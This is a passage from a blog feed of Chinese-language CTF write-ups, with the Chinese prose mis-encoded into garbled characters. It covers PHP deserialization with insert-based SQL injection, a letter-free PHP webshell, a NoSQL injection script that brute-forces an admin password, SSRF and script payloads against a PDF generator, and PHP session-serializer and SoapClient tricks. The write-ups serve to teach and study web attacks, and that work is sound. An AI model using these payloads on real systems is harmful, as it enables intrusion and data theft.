variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>__destructé­”æœ¯æ–¹æ³•</p><h5 id="show-php"><a href="#show-php" class="headerlink" title="show.php"></a>show.php</h5><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920192444172.png" alt="image-20210920192444172"></p><p>ååºåˆ—åŒ–</p><h5 id="æ€»çš„æ¥è¯´å°±æ˜¯"><a href="#æ€»çš„æ¥è¯´å°±æ˜¯" class="headerlink" title="æ€»çš„æ¥è¯´å°±æ˜¯"></a>æ€»çš„æ¥è¯´å°±æ˜¯</h5><p>1.å›¾ç‰‡ä¼ ä¸Šä¹‹åŽï¼Œcheckå‡½æ•°å¹¶æœªå¯¹æ–‡ä»¶å(title)è¿›è¡Œæ£€æµ‹, ç›´æŽ¥ä¼ é€’åˆ°æœ€åŽçš„SQLè¯­å¥å½“ä¸­ã€‚å¯¼è‡´<br>äº†SQLæ³¨å…¥ï¼Œå¹¶ä¸”å±žäºŽInsertæ³¨å…¥ã€‚<br>2.å›¾ç‰‡æ•°æ®åœ¨ä¿å­˜çš„æ—¶å€™ï¼Œä¼šå°†å›¾ç‰‡çš„é«˜åº¦å’Œå®½åº¦è¿›è¡Œåºåˆ—åŒ–ç„¶åŽä¿å­˜ã€‚<br>3.åœ¨æŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯çš„é¡µé¢(show.php)ä¼šå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ã€‚</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>æ‰§è¡Œ</p><pre><code>O:6:"helper":2:{s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";}</code></pre><p>æ”¹ä¸º</p><pre><code>O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}</code></pre><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194842880.png" alt="image-20210920194842880"></p><pre><code>1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg</code></pre><p>ä¸Šä¼ çš„æ—¶å€™æ›´æ”¹æ–‡ä»¶å</p><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194226160.png" alt="image-20210920194226160"></p><p>ç„¶åŽè®¿é—®show.php</p><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194251078.png" alt="image-20210920194251078"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTFï¼š2018-GetShell</title>
      <link href="2021/09/19/suctf-2018-getshell/"/>
      <url>2021/09/19/suctf-2018-getshell/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>     <span class="token punctuation">}</span> </code></pre><p>å‘çŽ°éœ€è¦ä½¿ç”¨ä¸å¸¦æ•°å­—å’Œå­—æ¯çš„<img src="/2021/09/19/suctf-2018-getshell/289CBA51.png" alt="img"></p><p>UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚â€™å’Œâ€™{2}çš„ç»“æžœæ˜¯â€\x8câ€ï¼Œå…¶å–åå³ä¸ºå­—æ¯s</p><pre><code>&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~èŒ‰[$____];$___.=~å†…[$____];$___.=~èŒ‰[$____];$___.=~è‹[$____];$___.=~çš„[$____];$___.=~å’©[$____];$_____=_;$_____.=~è¯¾[$____];$_____.=~å°¬[$____];$_____.=~ç¬”[$____];$_____.=~ç«¯[$____];$__________=$$_____;$___($__________[~çžŽ[$____]]);</code></pre><p><img src="/2021/09/19/suctf-2018-getshell/image-20210919153709028.png" alt="image-20210919153709028"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTFï¼š2019-StrongestMind</title>
      <link href="2021/09/18/gxyctf-2019-strongestmind/"/>
      <url>2021/09/18/gxyctf-2019-strongestmind/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/18/gxyctf-2019-strongestmind/image-20210918205216019.png" alt="image-20210918205216019"></p><p>ç”¨è„šæœ¬æŠŠå®ƒè·‘å‡ºæ¥</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">'http://5c04e4f0-712d-4693-b7ab-cdf6559f2ecd.node4.buuoj.cn:81//'</span>    match <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">"[0-9]+ [+|-] [0-9]+"</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        str <span class="token operator">=</span> match<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print(eval(str))</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> eval<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">}</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{} : {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>eval<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(r.text)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    count<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¥¥äº‘æ¯ï¼š2021-PackageManager</title>
      <link href="2021/09/17/xiang-yun-bei-2021-packagemanager/"/>
      <url>2021/09/17/xiang-yun-bei-2021-packagemanager/</url>
      
        <content type="html"><![CDATA[<h5 id="routes-index-ts-auth"><a href="#routes-index-ts-auth" class="headerlink" title="routes/index.ts/auth"></a>routes/index.ts/auth</h5><pre><code>router.post('/auth', async (req, res) =&gt; {    let { token } = req.body;    if (token !== '' &amp;&amp; typeof (token) === 'string') {        if (checkmd5Regex(token)) {            try {                let docs = await User.$where(`this.username == "admin" &amp;&amp; hex_md5(this.password) == "${token.toString()}"`).exec()                console.log(docs);                if (docs.length == 1) {                    if (!(docs[0].isAdmin === true)) {                        return res.render('auth', { error: 'Failed to auth' })                    }                } else {                    return res.render('auth', { error: 'No matching results' })                }            } catch (err) {                return res.render('auth', { error: err })            }        } else {            return res.render('auth', { error: 'Token must be valid md5 string' })        }    } else {        return res.render('auth', { error: 'Parameters error' })    }    req.session.AccessGranted = true    res.redirect('/packages/submit')});</code></pre><p>${token.toString()}ä¼šè¿›è¡ŒsqlæŸ¥è¯¢</p><h5 id="utils-ts"><a href="#utils-ts" class="headerlink" title="utils.ts"></a>utils.ts</h5><pre><code>const checkmd5Regex = (token: string) =&gt; {  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);}</code></pre><pre><code>import requestsimport stringurl="http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81/auth"headers={    "Cookie": "session=s%3AWbkqqZLgEJyWVUz5y8XshWYlmJCKq6Cc.swkxtSblPsO3VUzLYTgmdBJnyrOvYaEZNTib2n25ELk",    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",    "Referer": "http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81/packages/submit",    "Origin": "http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81",    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",    "Upgrade-Insecure-Requests": "1",}flag = ''for i in range(10000):    for j in string.printable:        if j == '"':            continue        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)        #print(payload)        data={            "_csrf":"fGncfKRG-Eut4uMRWH_RLxlj68DotG18-25I",            "token":payload        }        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)        #print(r.text)        if "Found. Redirecting to" in r.text:            #print(payload)            flag+=j            print(flag)            break"!@#&amp;@&amp;@efefef*@((@))grgregret3r""!@#&amp;@&amp;@efefef*@((@))grgregret3r"</code></pre><p>ç™»å½•èŽ·å¾—flagå°±å¥½</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¥¥äº‘æ¯ï¼š2021-secrets_of_admin</title>
      <link href="2021/09/16/xiang-yun-bei-2021-secrets-of-admin/"/>
      <url>2021/09/16/xiang-yun-bei-2021-secrets-of-admin/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916162929910.png" alt="image-20210916162929910"></p><p>ä¸‹è½½æºç </p><p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916162953995.png" alt="image-20210916162953995"></p><p>åœ¨database.jsä¸­å‘çŽ°adminè´¦å·å¯†ç ï¼š</p><pre><code>INSERT INTO users (id, username, password) VALUES (1, 'admin','e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645');</code></pre><p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916163553079.png" alt="image-20210916163553079"></p><p>æˆ‘ä»¬è¦é€šè¿‡SSRFæŠŠsuperuserä¸­çš„flagæ–‡ä»¶æ·»åŠ åˆ°adminä¸­å¹¶è¯»å–</p><h5 id="routes-index-ts"><a href="#routes-index-ts" class="headerlink" title="routes/index.ts"></a>routes/index.ts</h5><p>contentå‚æ•°å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡</p><pre><code>router.post('/admin', checkAuth, (req, res, next) =&gt; {    let { content } = req.body;    if ( content == '' || content.includes('&lt;') || content.includes('&gt;') || content.includes('/') || content.includes('script') || content.includes('on')){        // even admin can't be trusted right ? :)          return res.render('admin', { error: 'Forbidden word ðŸ¤¬'});    } else {        let template = `        &lt;html&gt;        &lt;meta charset="utf8"&gt;        &lt;title&gt;Create your own pdfs&lt;/title&gt;        &lt;body&gt;        &lt;h3&gt;${content}&lt;/h3&gt;        &lt;/body&gt;        &lt;/html&gt;        `        try {            const filename = `${uuid()}.pdf`            pdf.create(template, {                "format": "Letter",                "orientation": "portrait",                "border": "0",                "type": "pdf",                "renderDelay": 3000,                "timeout": 5000            }).toFile(`./files/${filename}`, async (err, _) =&gt; {                if (err) next(createError(500));                const checksum = await getCheckSum(filename);                await DB.Create('superuser', filename, checksum)                return res.render('admin', { message : `Your pdf is successfully saved ðŸ¤‘ You know how to download it right?`});            });        } catch (err) {            return res.render('admin', { error : 'Failed to generate pdf ðŸ˜¥'})        }    }});</code></pre><p>æ­£åˆ™ä»…å…è®¸127.0.0.1</p><pre><code>router.get('/api/files', async (req, res, next) =&gt; {    if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {        return next(createError(401));</code></pre><p>ä»£ç æ˜¾ç¤ºæˆ‘ä»¬å¯ä»¥ä»»æ„ç”¨æˆ·åã€æ–‡ä»¶åã€å’Œchecknumæ¥å¾€æ•°æ®åº“ä¸­æ·»åŠ æ–‡ä»¶</p><pre><code> if (typeof(username) == "string" &amp;&amp; typeof(filename) == "string" &amp;&amp; typeof(checksum) == "string") {        try {            await DB.Create(username, filename, checksum)</code></pre><p>éœ€è¦æŠŠ<code>flag</code>ç»™<code>admin</code>ç”¨æˆ·</p><pre><code>   let filename = await DB.getFile(token.username, req.params.id)            if (fs.existsSync(path.join(__dirname , "../files/", filename))){                return res.send(await readFile(path.join(__dirname , "../files/", filename)));</code></pre><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>content[]=&lt;script&gt;var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123", true);xhr.send();&lt;/script&gt;</code></pre><pre><code>content[]=&lt;script&gt;location.href="http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123";&lt;/script&gt;</code></pre><pre><code>content[]=a&amp;content[]=&lt;img src="http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123"&gt;</code></pre><p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916181139977.png" alt="image-20210916181139977"></p><p>è®¿é—®/api/files/123</p><p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916181220555.png" alt="image-20210916181220555"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LCTFï¼š2018-Bestphp&#39;sRevenge</title>
      <link href="2021/09/15/lctf-2018-bestphp-srevenge/"/>
      <url>2021/09/15/lctf-2018-bestphp-srevenge/</url>
      
        <content type="html"><![CDATA[<h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><h5 id="1-1-call-user-func"><a href="#1-1-call-user-func" class="headerlink" title="1.1 call_user_func"></a>1.1 call_user_func</h5><p>ç”¨æ¥æ‰§è¡Œå‡½æ•°ï¼Œä½†æˆ‘æµ‹è¯•çš„ï¼Œåªèƒ½æ‰§è¡Œä¸€éƒ¨åˆ†å‡½æ•°ï¼Œåƒevalå‡½æ•°ï¼Œå°±æ‰§è¡Œä¸äº†ã€‚</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">call_user_func</span><span class="token punctuation">(</span>fun<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>      \<span class="token package"><span class="token punctuation">\</span>outcome</span>ï¼š<span class="token number">12</span></code></pre><p>ä½†å¦‚æžœä¼ å…¥çš„å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä¸€ä¸ªç±»çš„åå­—ï¼Œæˆ–ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆï¼Œå°±ä¼šæŠŠæ•°ç»„çš„ç¬¬äºŒä¸ªå€¼ï¼Œå½“åšæ–¹æ³•ï¼Œç„¶åŽæ‰§è¡Œã€‚</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">fun</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  \<span class="token package"><span class="token punctuation">\</span></span>å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œ        <span class="token keyword">echo</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"aaaas"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>   \<span class="token package"><span class="token punctuation">\</span>outcome</span>ï¼š<span class="token number">11</span></code></pre><h5 id="1-2-phpåºåˆ—åŒ–å¼•æ“Ž"><a href="#1-2-phpåºåˆ—åŒ–å¼•æ“Ž" class="headerlink" title="1.2 phpåºåˆ—åŒ–å¼•æ“Ž"></a>1.2 phpåºåˆ—åŒ–å¼•æ“Ž</h5><p>å‡å¦‚æˆ‘ä»¬ä½¿ç”¨php_serializeå¼•æ“Žæ—¶è¿›è¡Œæ•°æ®å­˜å‚¨æ—¶çš„åºåˆ—åŒ–ï¼Œå¯ä»¥å¾—åˆ°å†…å®¹</p><pre><code>$_SESSION[â€˜nameâ€™] = â€˜skyâ€™;a:1:{s:4:â€nameâ€;s:3:â€skyâ€;}</code></pre><p>è€Œåœ¨phpå¼•æ“Žæ—¶è¿›è¡Œæ•°æ®å­˜å‚¨æ—¶çš„åºåˆ—åŒ–ï¼Œå¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªå†…å®¹</p><pre><code>$_SESSION[â€˜nameâ€™] = â€˜skyâ€™;name|s:3:â€skyâ€</code></pre><p>phpä»¥â€œ|â€ç¬¦å·åˆ†éš”é”®ä¸Žå€¼ï¼Œé‚£ä¹ˆå¦‚æžœæˆ‘ä»¬ç”¨php_serializeåšåºåˆ—åŒ–å¼•æ“Žï¼Œä¸”æ•°ç»„çš„å€¼é‡Œï¼Œå°±åŒ…å«â€œ|â€ç¬¦å·ï¼Œ</p><pre><code>$_SESSION[â€˜nameâ€™] = â€˜|skyâ€™;a:1:{s:4:â€nameâ€;s:4:â€|skyâ€;}</code></pre><p>ç„¶åŽç”¨phpå¼•æ“ŽåŽ»ååºåˆ—åŒ–ï¼Œå› ä¸ºphpä»¥â€œ|â€ç¬¦å·åˆ†éš”é”®ä¸Žå€¼ï¼Œæ‰€ä»¥å°±ä¼šå½¢æˆa:1:{s:4:â€nameâ€;s:3:â€ä¸ºé”®ï¼Œskyä¸ºå€¼å¾—æƒ…å†µï¼Œè¿™æ ·ä¸€æ¥ï¼Œskyå°±ä¼šè¢«å•ç‹¬å¾—æ‹¿å‡ºæ¥ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œè€Œä¸æ˜¯ç›´æŽ¥è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç›´æŽ¥æ‰“å°å‡ºæ¥ã€‚</p><h5 id="1-3-cookie-å’Œ-session"><a href="#1-3-cookie-å’Œ-session" class="headerlink" title="1.3 cookie å’Œ session"></a>1.3 cookie å’Œ session</h5><p>åšäº†è¿™é“é¢˜ï¼Œæˆ‘æ‰çœŸå®žçš„æ„Ÿå—åˆ°ï¼Œcookieå’Œsessionï¼Œæ˜¯ä¸€ ä¸€å¯¹åº”çš„ã€‚ä¸åŒçš„cookieï¼Œå®ƒå¯¹åº”çš„sessionçš„å€¼æ˜¯ä¸åŒçš„ã€‚<br>1.æˆ‘ä»¬ä¼ å…¥name=123ï¼Œå°±ä¼šåœ¨æ­¤cookieï¼Œå¯¹åº”å¾—sessionä¸­ï¼Œæ·»åŠ a:1:{s:4:â€nameâ€;s:3:â€123â€;}(sesionéƒ½æ˜¯åºåˆ—åŒ–å­˜å‚¨çš„)</p><h5 id="1-4-CRLF-Injectionæ¼æ´ž"><a href="#1-4-CRLF-Injectionæ¼æ´ž" class="headerlink" title="1.4 CRLF Injectionæ¼æ´ž"></a>1.4 CRLF Injectionæ¼æ´ž</h5><p>CRLF Injectionæ¼æ´ž<br>è¿™ä¸ªæ˜¯å’Œä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹è”ç³»åœ¨ä¸€èµ·çš„ï¼Œæˆ‘ä»¬è¦è®©æœåŠ¡å™¨åŽ»è®¿é—®flag.phpï¼Œä¸”æŠŠflagå­˜æ”¾åœ¨sessioné‡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸€å®šéœ€è¦æºå¸¦ä¸€ä¸ªcookieåŽ»è®¿é—®å®ƒã€‚ä½†æ˜¯SoapClientè¿™ä¸ªç±»ï¼Œå¥½åƒæ²¡æœ‰æŒ‡å®šcookieçš„æŽ¥å£ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨user_agenté‡Œé¢ï¼ŒåŠ ä¸Šä¸€ä¸ª\r\nï¼Œç„¶åŽå†åŠ ä¸Šä¸€ä¸ªcookieï¼Œå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</p><h5 id="1-5-SoapClient"><a href="#1-5-SoapClient" class="headerlink" title="1.5 SoapClient"></a>1.5 SoapClient</h5><p>è¿™æ˜¯ä¸€ä¸ªphpå†…ç½®çš„ç±»ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘åŽï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚è¯¥ç±»çš„æž„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p><pre><code>public SoapClient :: SoapClient ï¼ˆmixed $wsdl [ï¼Œarray $options ]ï¼‰</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜Žæ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æžœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æžœåœ¨éžwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚<br>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åŽï¼Œå°±å¾ˆå®¹æ˜“æž„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç„¶åŽç¬¬äºŒä¸ªå‚æ•°çš„locationé€‰é¡¹è®¾ç½®ä¸ºtarget_url</p><h6 id="1-6-ini-set-å’Œ-session-start"><a href="#1-6-ini-set-å’Œ-session-start" class="headerlink" title="1.6 ini_set å’Œ session_start"></a>1.6 ini_set å’Œ session_start</h6><p>æˆ‘ä»¬è¦æ›´æ”¹â€œsession.serialize_handlerâ€çš„å€¼ï¼Œæœ¬æ¥åº”è¯¥ä½¿ç”¨ini_setè¿™ä¸ªå‡½æ•°çš„ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œä¸æŽ¥å—æ•°ç»„ï¼Œæ‰€ä»¥å°±ä¸è¡Œäº†ã€‚äºŽæ˜¯æˆ‘ä»¬å°±ç”¨session_startæ¥ä»£æ›¿ï¼Œsession.serialize_handler=php_serializeä¹Ÿå˜æˆäº†ï¼Œserialize_handler=php_serializeã€‚</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'implode'</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> </code></pre><h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h5><pre><code>only localhost can get flag!session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){       $_SESSION['flag'] = $flag;   } only localhost can get flag!</code></pre><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><h5 